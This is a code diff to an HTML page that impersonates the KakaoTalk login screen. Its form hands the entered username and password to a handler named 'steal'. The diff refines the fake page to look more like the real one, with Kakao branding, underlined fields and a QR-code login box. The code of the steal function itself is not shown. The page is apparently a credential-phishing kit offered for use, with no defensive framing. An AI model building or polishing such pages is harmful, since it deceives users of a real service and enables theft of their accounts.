@@ -24,43 +24,40 @@
       text-align: center;
     }
 
-    .logo {
-      width: 150px;
-      margin-bottom: 10px;
-    }
-
     .heading {
       font-size: 36px;
       font-weight: bold;
-      color: #ffcc00; /* KakaoTalk's signature yellow */
+      color: black; /* Kakao in black letters */
       margin-bottom: 20px;
     }
 
-    .box {
-      border: 1px solid #dbdbdb;
-      padding: 20px;
-      margin: 20px 0;
-    }
-
-    input {
+    .input-field {
       width: 100%;
       padding: 10px;
       margin: 6px 0;
       font-size: 14px;
-      background: #fafafa;
-      border: 1px solid #dbdbdb;
-      border-radius: 3px;
+      background: transparent;
+      border: none;
+      border-bottom: 1px solid #dbdbdb; /* Underlined input fields */
     }
 
     button {
       background-color: #ffcc00; /* KakaoTalk's signature yellow color */
       border: none;
-      color: white;
+      color: black; /* Black letters in the button */
       padding: 8px;
       margin-top: 10px;
       width: 100%;
       font-weight: bold;
       border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .qr-box {
+      border: 1px solid #dbdbdb;
+      padding: 15px;
+      margin-top: 20px;
+      background-color: #fafafa;
       cursor: pointer;
     }
 
@@ -105,18 +102,23 @@
 
 <body>
   <div class="container">
-    <div class="heading">Kakao</div> <!-- Large Kakao phrase at the top -->
-    <img src="https://www.kakaocorp.com/img/logo/kor/logo-kakaotalk.png" alt="KakaoTalk" class="logo">
+    <div class="heading">Kakao</div> <!-- Large Kakao phrase in black letters -->
 
     <div class="box">
       <form onsubmit="steal(event)">
-        <input id="username" type="text" placeholder="Kakao Mail ID, email, or phone number" required>
-        <input id="password" type="password" placeholder="Password" required>
+        <!-- Underlined input fields -->
+        <input class="input-field" id="username" type="text" placeholder="KakaoMail ID, email, or phone number" required>
+        <input class="input-field" id="password" type="password" placeholder="Password" required>
         <button type="submit">Log In</button>
       </form>
 
       <div class="or-separator"><span>OR</span></div>
-      <div style="font-size: 14px; color: #ffcc00; font-weight: 500;">Log in with Kakao</div>
+
+      <!-- QR Code Login (Gray box) -->
+      <div class="qr-box">
+        QR Code Login
+      </div>
+
       <div class="footer">
         <a href="#">Terms of Use</a> | 
         <a href="#">Privacy Policy</a> | 
@@ -129,7 +131,6 @@
     <div class="footer" style="margin-top: 10px;">
       <a href="#">Simple login information storage</a> | 
       <a href="#">View help</a> | 
-      <a href="#">QR code login</a> | 
       <a href="#">Sign up</a> | 
       <a href="#">Find account</a> | 
       <a href="#">Find password</a>
@@ -182,3 +183,4 @@
   </script>
 </body>
 </html>
+
